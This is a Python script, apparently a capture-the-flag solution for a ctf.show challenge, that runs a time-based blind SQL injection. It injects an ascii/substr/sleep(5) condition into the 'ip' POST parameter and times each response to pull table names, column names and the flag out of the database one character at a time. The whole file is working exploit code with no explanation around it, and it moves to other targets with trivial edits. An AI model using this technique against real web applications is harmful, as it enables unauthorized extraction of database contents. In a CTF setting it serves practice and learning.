# author:yu22x
import requests
import time
import string

str = string.digits + string.ascii_lowercase + "{-}"
url = 'http://aefdd3a0-6ad0-4b74-abbd-d6f603e53ad0.challenge.ctf.show/api/'
flag = ''

for i in range(1, 46):
    print(i)
    for j in range(32, 126):
        # 表名
        # payload = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'
        # 列名
        # payload = 'select group_concat(column_name) from information_schema.columns where table_name="ctfshow_flagxc"'
        # 值
        payload = 'select group_concat(flagaa) from ctfshow_flagxc'
        data = {
            'ip': f"' or if(ascii(substr(({payload}), {i}, 1))={j},sleep(5), 1) and '1'='1",
            'debug': 0
        }
        # print(data)
        stime = time.time()
        # print(url + payload)
        r = requests.post(url, data=data)
        etime = time.time()
        if etime - stime >= 5:
            flag += chr(j)
            print(flag)
            break
